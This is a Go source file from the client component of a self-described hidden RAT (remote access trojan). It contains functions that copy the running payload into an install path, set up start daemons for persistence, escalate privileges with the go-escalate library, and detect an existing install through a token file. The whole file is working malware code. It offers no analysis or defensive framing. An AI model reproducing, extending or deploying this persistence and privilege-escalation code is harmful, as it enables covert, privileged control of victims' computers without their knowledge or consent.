// +build !android

package client

import (
	"errors"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"

	"github.com/lu4p/go-escalate"
)

// SetupDaemon installs multiple start daemons for payload persistence
func SetupDaemon() {
	log.Println("[SetupDaemon] Passing off to Daemon installer...")
	go Persist(PathExe)
}

// installExecuteable copys the currently running executeable
// TODO: Remove duplicate source payload once RAT is installed
func installExecuteable() error {
	if err := os.RemoveAll(Path); err != nil {
		log.Println("[InstallExe] [!] Could NOT clear executeable path:", err)
		return err
	}

	ex, err := os.Executable()
	if err != nil {
		log.Println("[InstallExe] [!] Couldn't find the currently running exe:", err)
		return err
	}

	data, err := ioutil.ReadFile(ex)
	if err != nil {
		log.Println("[InstallExe] [!] Could not read current exe:", err)
		return err
	}

	if err = os.MkdirAll(Path, os.ModePerm); err != nil {
		log.Println("[InstallExe] [!] Could not create path for new exe:", err)
		return err
	}

	if err = ioutil.WriteFile(PathExe, data, os.ModePerm); err != nil {
		log.Println("[InstallExe] [!] Could not write exe to path:", err)
		return err
	}

	return nil
}

// Elevate uses github.com/lu4p/go-escalate to attempt a privilege
// escalation on the currently running running process
// TODO: Remove duplicate payloads once a successful elevate
func Elevate() error {
	log.Println("[Elevate] Installing payload into:", PathExe)

	err := installExecuteable()
	if err != nil {
		return errors.New("[Elevate] [!] Could NOT copy payload into target path")
	}
	log.Println("[Elevate] [+] Successfully copied payload into target path")

	return escalate.Escalate(PathExe)
}

// CheckExistingInstall checks if a payload has already been deployed and is the
// currently running proccess. This is needed because duplicate payloads are required
// during escalation and the installation of the hidden RAT
func CheckExistingInstall() bool {
	osexe, _ := os.Executable()
	if osexe == PathExe {
		_, err := os.Stat(filepath.Join(Path, "token"))
		if err != nil {
			log.Println("[CheckExisting] [!] Host key token is missing")
			return false
		}
		log.Println("[CheckExisting] I AM the existing install!")
		return true
	}
	log.Println("[CheckExisting] I am NOT the existing install!")
	return false
}
